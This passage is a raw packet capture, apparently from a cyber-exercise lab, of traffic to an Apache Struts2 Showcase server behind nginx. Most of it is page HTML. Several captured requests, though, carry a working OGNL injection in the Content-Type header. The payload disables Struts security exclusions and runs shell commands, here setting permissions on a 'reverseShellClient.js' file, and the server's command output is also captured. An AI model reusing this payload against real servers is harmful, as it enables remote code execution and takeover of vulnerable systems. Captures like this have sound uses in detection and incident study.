+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/actionTag/showActionTagDemo.action">Action Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/date.jsp">Date Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/debugTagDemo.action">Debug Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/iteratorGeneratorTag/showGeneratorTagDemo.action">Iterator Generator Tag</a></li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/appendIteratorTag/showAppendTagDemo.action">Append Iterator Tag</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/mergeIteratorTag/showMergeTagDemo.action">Merge Iterator Demo</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/subsetIteratorTag/showSubsetTagDemo.action">Subset Tag</a>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/actionPrefix/actionPrefixExampleUsingFreemarker.action">Action Prefix Example (Freemarker)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/ifTag/testIfTagJsp.action">If Tag (JSP)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/ifTag/testIfTagFreemarker.action">If Tag (Freemarker)</a></li>
+........</ul>
+
+.......</li>
+.......<li class="dropdown-submenu">
+........<a href="#">UI Tags</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/example!input.action">UI Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/exampleVelocity!input.action">UI Example (Velocity)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/lotsOfOptiontransferselect!input.action">Option Transfer Select UI Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/moreSelects!input.action">More Select Box UI Examples</a></li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/treeExampleStatic.jsp">Tree Example (static)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/showDynamicTreeAction.action">Tree Example (dynamic)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/showDynamicAjaxTreeAction.action">Tree Example (dynamic ajax loading)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/componentTagExample.jsp">Component Tag Example</a>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/actionTagExample!input.action">Action Tag Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/datepicker/index.jsp">DateTime picker tag - Pick a date</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/timepicker/index.jsp">DateTime picker tag - Pick a time</a></li>
+.........
+........</ul>
+.......</li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">File<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li><a href="/struts2-showcase-2.3.12/filedownload/index.jsp">File Download</a></li>
+.......<li class="dropdown-submenu">
+........<a href="#">File Upload</a>
+........<ul class="dropdown-menu">
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/fileupload/upload.action">Single File Upload</a>
+.........</li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/fileupload/multipleUploadUsingList.action">Multiple File Upload (List)</a>
+
+.........</li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/fileupload/multipleUploadUsingArray.action">Multiple File Upload (Array)</a>
+.........</li>
+........</ul>
+.......</li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Examples<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li class="dropdown-submenu">
+........<a href="#">Hangman</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/hangman/hangmanNonAjax.action">Hangman (Non Ajax)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/hangman/hangmanAjax.action">Hangman (Ajax - Experimental)</a></li>
+........</ul>
+.......</li>
+.......<li><a href="/struts2-showcase-2.3.12/person/index.jsp">Person Manager</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/empmanager/index.jsp">CRUD</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/wait/index.jsp">Execute &amp; Wait</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/token/index.jsp">Token</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/validation/index.jsp">Validation</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/modelDriven/modelDriven.action">Model Driven</a></li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Integration<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li class="dropdown-submenu">
+........<a href="#">Freemarker</a>
+........<ul class="dropdown-menu">
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/freemarker/customFreemarkerManagerDemo.action">Demo of usage of a Custom Freemarker Manager</a>
+.........</li>
+.........<.
+9ad.
+li>
+..........
+..........<a href="/struts2-showcase-2.3.12/freemarker/standardTags.action">Demo of Standard Struts Freemarker Tags</a>
+.........</li>
+........</ul>
+.......</li>
+.......<li><a href="/struts2-showc
+
+T 192.168.1.100:80 -> 192.168.33.1:56564 [A]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Fri, 19 Jan 2018 04:46:50 GMT.
+Content-Type: text/html;charset=ISO-8859-1.
+Transfer-Encoding: chunked.
+Connection: keep-alive.
+Set-Cookie: JSESSIONID=8B2D9A1FB24A22C9E3DD94CCF8B9DA7F; Path=/struts2-showcase-2.3.12; HttpOnly.
+.
+1eea.
+<!DOCTYPE html>
+
+
+
+
+
+
+<html lang="en">
+<head>
+.<meta charset="utf-8">
+.<meta name="viewport" content="width=device-width, initial-scale=1.0">
+.<meta http-equiv='Content-Type' content='text/html; charset=UTF-8' />
+.<meta name="description" content="Struts2 Showcase for Apache Struts Project">
+.<meta name="author" content="The Apache Software Foundation">
+
+.<title>Struts2 Showcase</title>
+
+.<link href="/struts2-showcase-2.3.12/styles/bootstrap.css" rel="stylesheet"
+.      type="text/css" media="all">
+.<link href="/struts2-showcase-2.3.12/styles/bootstrap-responsive.css" rel="stylesheet"
+.      type="text/css" media="all">
+.<link href="/struts2-showcase-2.3.12/styles/main.css" rel="stylesheet" type="text/css"
+.      media="all"/>
+
+.<script src="/struts2-showcase-2.3.12/js/jquery-1.8.2.min.js"></script>
+.<script src="/struts2-showcase-2.3.12/js/bootstrap.min.js"></script>
+.<script type="text/javascript">
+..$(function () {
+...$('.dropdown-toggle').dropdown();
+...var alerts = $('ul.alert').wrap('<div />');
+...alerts.prepend('<a class="close" data-dismiss="alert" href="#">&times;</a>');
+...alerts.alert();
+..});
+.</script>
+
+.<!-- Prettify -->
+.<link href="/struts2-showcase-2.3.12/styles/prettify.css" rel="stylesheet">
+.<script src="/struts2-showcase-2.3.12/js/prettify.js"></script>
+
+.<!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
+.<!--[if lt IE 9]>
+.<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+.<![endif]-->
+
+.<script src="/struts2-showcase-2.3.12/struts/utils.js" type="text/javascript"></script>
+</head>
+
+<body id="page-home" onload="prettyPrint();">
+
+<div class="navbar navbar-fixed-top">
+.<div class="navbar-inner">
+..<div class="container-fluid">
+...<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+....<span class="icon-bar"></span>
+....<span class="icon-bar"></span>
+....<span class="icon-bar"></span>
+...</a>
+...<a href="/struts2-showcase-2.3.12/showcase.jsp" class="brand">Struts2 Showcase</a>
+...<div class="nav-collapse">
+....<ul class="nav">
+.....<li><a href="/struts2-showcase-2.3.12/showcase.jsp"><i class="icon-home"></i> Home</a></li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Configuration<b
+........class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li><a href="/struts2-showcase-2.3.12/actionchaining/actionChain1!input.action">Action Chaining</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/config-browser/index.action">Config Browser</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/conversion/index.jsp">Conversion</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/person/index.jsp">Person Manager ( by Conventions )</a></li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Tags<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li class="dropdown-submenu">
+........<a href="#">Non UI Tags</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/actionTag/showActionTagDemo.action">Action Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/date.jsp">Date Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/debugTagDemo.action">Debug Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/iteratorGeneratorTag/showGeneratorTagDemo.action">Iterator Generator Tag</a></li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/appendIteratorTag/showAppendTagDemo.action">Append Iterator Tag</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/mergeIteratorTag/showMergeTagDemo.action">Merge Iterator Demo</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/subsetIteratorTag/showSubsetTagDemo.action">Subset Tag</a>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/actionPrefix/actionPrefixExampleUsingFreemarker.action">Action Prefix Example (Freemarker)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/ifTag/testIfTagJsp.action">If Tag (JSP)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/ifTag/testIfTagFreemarker.action">If Tag (Freemarker)</a></li>
+........</ul>
+
+.......</li>
+.......<li class="dropdown-submenu">
+........<a href="#">UI Tags</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/example!input.action">UI Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/exampleVelocity!input.action">UI Example (Velocity)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/lotsOfOptiontransferselect!input.action">Option Transfer Select UI Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/moreSelects!input.action">More Select Box UI Examples</a></li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/treeExampleStatic.jsp">Tree Example (static)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/showDynamicTreeAction.action">Tree Example (dynamic)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/showDynamicAjaxTreeAction.action">Tree Example (dynamic ajax loading)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/componentTagExample.jsp">Component Tag Example</a>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/actionTagExample!input.action">Action Tag Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/datepicker/index.jsp">DateTime picker tag - Pick a date</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/timepicker/index.jsp">DateTime picker tag - Pick a time</a></li>
+.........
+........</ul>
+.......</li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">File<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li><a href="/struts2-showcase-2.3.12/filedownload/index.jsp">File Download</a></li>
+.......<li class="dropdown-submenu">
+........<a href="#">File Upload</a>
+........<ul class="dropdown-menu">
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/fileupload/upload.action">Single File Upload</a>
+.........</li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/fileupload/multipleUploadUsingList.action">Multiple File Upload (List)</a>
+
+.........</li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/fileupload/multipleUploadUsingArray.action">Multiple File Upload (Array)</a>
+.........</li>
+........</ul>
+.......</li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Examples<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li class="dropdown-submenu">
+........<a href="#">Hangman</a>
+........<ul class="dropdown-menu">
+.........<li><a hre
+
+T 192.168.33.20:57861 -> 192.168.1.100:80 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+User-Agent: Mozilla/5.0.
+Content-Type: Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='6. chmod 700 reverseShellClient.js').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.
+host: target.cyexc-target.
+Connection: close.
+.
+
+
+T 192.168.1.100:37891 -> 192.168.1.10:8080 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+X-Forwarded-Host: target.cyexc-target.
+X-Forwarded-Server: target.cyexc-target.
+X-Forwarded-For: 192.168.33.20.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.20.
+Host: target.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0.
+Content-Type: Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='6. chmod 700 reverseShellClient.js').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.
+.
+
+
+T 192.168.1.10:8080 -> 192.168.1.100:37891 [AP]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Transfer-Encoding: chunked.
+Date: Fri, 19 Jan 2018 04:47:30 GMT.
+Connection: close.
+.
+21.
+/bin/bash: 6.: command not found
+.
+
+
+T 192.168.1.100:80 -> 192.168.33.20:57861 [AP]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Fri, 19 Jan 2018 04:47:30 GMT.
+Transfer-Encoding: chunked.
+Connection: close.
+.
+21.
+/bin/bash: 6.: command not found
+.
+
+
+T 192.168.33.20:57862 -> 192.168.1.100:80 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+User-Agent: Mozilla/5.0.
+Content-Type: Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='chmod 700 reverseShellClient.js').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.
+host: target.cyexc-target.
+Connection: close.
+.
+
+
+T 192.168.1.100:37892 -> 192.168.1.10:8080 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+X-Forwarded-Host: target.cyexc-target.
+X-Forwarded-Server: target.cyexc-target.
+X-Forwarded-For: 192.168.33.20.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.20.
+Host: target.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0.
+Content-Type: Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='chmod 700 reverseShellClient.js').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.
+.
+
+
+T 192.168.1.10:8080 -> 192.168.1.100:37892 [AP]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Transfer-Encoding: chunked.
+Date: Fri, 19 Jan 2018 04:47:53 GMT.
+Connection: close.
+.
+
+
+T 192.168.1.100:80 -> 192.168.33.20:57862 [AP]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Fri, 19 Jan 2018 04:47:53 GMT.
+Transfer-Encoding: chunked.
+Connection: close.
+.
+
+
+T 192.168.33.20:57863 -> 192.168.1.100:80 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+User-Agent: Mozilla/5.0.
+Content-Type: Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='chmod 700 reverseShellClient.js').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.
+host: target.cyexc-target.
+Connection: close.
+.
+
+
+T 192.168.1.100:37893 -> 192.168.1.10:8080 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+X-Forwarded-Host: target.cyexc-target.
+X-Forwarded-Server: target.cyexc-target.
+X-Forwarded-For: 192.168.33.20.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.20.
+Host: target.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0.
+Content-Type: Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='chmod 700 reverseShellClient.js').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.
+.
+
+
+T 192.168.1.10:8080 -> 192.168.1.100:37893 [AP]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Transfer-Encoding: chunked.
+Date: Fri, 19 Jan 2018 04:48:15 GMT.
+Connection: close.
+.
+
+
+T 192.168.1.100:80 -> 192.168.33.20:57863 [AP]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Fri, 19 Jan 2018 04:48:15 GMT.
+Transfer-Encoding: chunked.
+Connection: close.
+.
+
+
+T 192.168.33.1:56582 -> 192.168.1.100:80 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+Host: target.cyexc-target.
+Accept: */*.
+Cookie: JSESSIONID=8B2D9A1FB24A22C9E3DD94CCF8B9DA7F.
+User-Agent: Bear/5767 CFNetwork/893.13.1 Darwin/17.3.0 (x86_64).
+Accept-Language: ja-jp.
+Accept-Encoding: gzip, deflate.
+Connection: keep-alive.
+.
+
+
+T 192.168.1.100:37894 -> 192.168.1.10:8080 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+X-Forwarded-Host: target.cyexc-target.
+X-Forwarded-Server: target.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: target.cyexc-target.
+Connection: close.
+Accept: */*.
+Cookie: JSESSIONID=8B2D9A1FB24A22C9E3DD94CCF8B9DA7F.
+User-Agent: Bear/5767 CFNetwork/893.13.1 Darwin/17.3.0 (x86_64).
+Accept-Language: ja-jp.
+Accept-Encoding: gzip, deflate.
+.
+
+
+T 192.168.1.10:8080 -> 192.168.1.100:37894 [A]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Content-Type: text/html;charset=ISO-8859-1.
+Transfer-Encoding: chunked.
+Date: Fri, 19 Jan 2018 04:48:43 GMT.
+Connection: close.
+.
+2000.
+<!DOCTYPE html>
+
+
+
+
+
+
+<html lang="en">
+<head>
+.<meta charset="utf-8">
+.<meta name="viewport" content="width=device-width, initial-scale=1.0">
+.<meta http-equiv='Content-Type' content='text/html; charset=UTF-8' />
+.<meta name="description" content="Struts2 Showcase for Apache Struts Project">
+.<meta name="author" content="The Apache Software Foundation">
+
+.<title>Struts2 Showcase</title>
+
+.<link href="/struts2-showcase-2.3.12/styles/bootstrap.css" rel="stylesheet"
+.      type="text/css" media="all">
+.<link href="/struts2-showcase-2.3.12/styles/bootstrap-responsive.css" rel="stylesheet"
+.      type="text/css" media="all">
+.<link href="/struts2-showcase-2.3.12/styles/main.css" rel="stylesheet" type="text/css"
+.      media="all"/>
+
+.<script src="/struts2-showcase-2.3.12/js/jquery-1.8.2.min.js"></script>
+.<script src="/struts2-showcase-2.3.12/js/bootstrap.min.js"></script>
+.<script type="text/javascript">
+..$(function () {
+...$('.dropdown-toggle').dropdown();
+...var alerts = $('ul.alert').wrap('<div />');
+...alerts.prepend('<a class="close" data-dismiss="alert" href="#">&times;</a>');
+...alerts.alert();
+..});
+.</script>
+
+.<!-- Prettify -->
+.<link href="/struts2-showcase-2.3.12/styles/prettify.css" rel="stylesheet">
+.<script src="/struts2-showcase-2.3.12/js/prettify.js"></script>
+
+.<!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
+.<!--[if lt IE 9]>
+.<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+.<![endif]-->
+
+.<script src="/struts2-showcase-2.3.12/struts/utils.js" type="text/javascript"></script>
+</head>
+
+<body id="page-home" onload="prettyPrint();">
+
+<div class="navbar navbar-fixed-top">
+.<div class="navbar-inner">
+..<div class="container-fluid">
+...<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+....<span class="icon-bar"></span>
+....<span class="icon-bar"></span>
+....<span class="icon-bar"></span>
+...</a>
+...<a href="/struts2-showcase-2.3.12/showcase.jsp" class="brand">Struts2 Showcase</a>
+...<div class="nav-collapse">
+....<ul class="nav">
+.....<li><a href="/struts2-showcase-2.3.12/showcase.jsp"><i class="icon-home"></i> Home</a></li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Configuration<b
+........class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li><a href="/struts2-showcase-2.3.12/actionchaining/actionChain1!input.action">Action Chaining</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/config-browser/index.action">Config Browser</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/conversion/index.jsp">Conversion</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/person/index.jsp">Person Manager ( by Conventions )</a></li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Tags<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li class="dropdown-submenu">
+........<a href="#">Non UI Tags</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/actionTag/showActionTagDemo.action">Action Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/date.jsp">Date Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/debugTagDemo.action">Debug Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/iteratorGeneratorTag/showGeneratorTagDemo.action">Iterator Generator Tag</a></li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/appendIteratorTag/showAppendTagDemo.action">Append Iterator Tag</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/mergeIteratorTag/showMergeTagDemo.action">Merge Iterator Demo</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/subsetIteratorTag/showSubsetTagDemo.action">Subset Tag</a>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/actionPrefix/actionPrefixExampleUsingFreemarker.action">Action Prefix Example (Freemarker)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/ifTag/testIfTagJsp.action">If Tag (JSP)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/ifTag/testIfTagFreemarker.action">If Tag (Freemarker)</a></li>
+........</ul>
+
+.......</li>
+.......<li class="dropdown-submenu">
+........<a href="#">UI Tags</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/example!input.action">UI Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/exampleVelocity!input.action">UI Example (Velocity)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/lotsOfOptiontransferselect!input.action">Option Transfer Select UI Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/moreSelects!input.action">More Select Box UI Examples</a></li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/treeExampleStatic.jsp">Tree Example (static)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/showDynamicTreeAction.action">Tree Example (dynamic)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/showDynamicAjaxTreeAction.action">Tree Example (dynamic ajax loading)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/componentTagExample.jsp">Component Tag Example</a>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/actionTagExample!input.action">Action Tag Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/datepicker/index.jsp">DateTime picker tag - Pick a date</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/timepicker/index.jsp">DateTime picker tag - Pick a time</a></li>
+.........
+........</ul>
+.......</li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">File<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li><a href="/struts2-showcase-2.3.12/filedownload/index.jsp">File Download</a></li>
+.......<li class="dropdown-submenu">
+........<a href="#">File Upload</a>
+........<ul class="dropdown-menu">
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/fileupload/upload.action">Single File Upload</a>
+.........</li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/fileupload/multipleUploadUsingList.action">Multiple File Upload (List)</a>
+
+.........</li>
+.........<li>
+..........
